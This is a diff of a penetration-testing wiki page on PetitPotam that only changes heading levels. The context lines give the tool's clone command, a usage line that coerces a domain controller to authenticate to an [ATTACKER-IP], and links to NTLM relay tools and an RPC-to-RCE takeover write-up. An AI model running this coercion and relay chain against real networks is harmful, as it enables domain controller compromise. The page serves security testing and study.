@@ -29,19 +29,19 @@ MS-EFSRPC - Encrypting File System Remote (EFSRPC) Protocol
 
 <https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31>
 
-### Installation
+## Installation
 
 ```plain
 git clone https://github.com/topotam/PetitPotam.git
 ```
 
-### Usage
+## Usage
 
 ```plain
 python3 Petitpotam.py -d '' -u '' -p '' [ATTACKER-IP] [TARGET-DC-IP]
 ```
 
-### Examples
+## Examples
 
 #### Checked against the following versions
 
@@ -143,7 +143,7 @@ For relaying have a look at
 * [Impacket - NTLMrelayx.py]({{< ref "ntlmrelayx-py" >}})
 * [CrackMapExec - Generate target list where targets do not require signing (SMB)]({{< ref "cme-smb" >}})
 
-### URL list
+## URL List
 
 * [Github.com - PetitPotam](https://github.com/topotam/PetitPotam)
 * [Github.com - From RPC to RCE - Workstation Takeover via RBCD and MS-RPChoose-Your-Own-Adventure](https://gist.github.com/audibleblink/06916db2a76c7bd13400c4f9da422ad5)
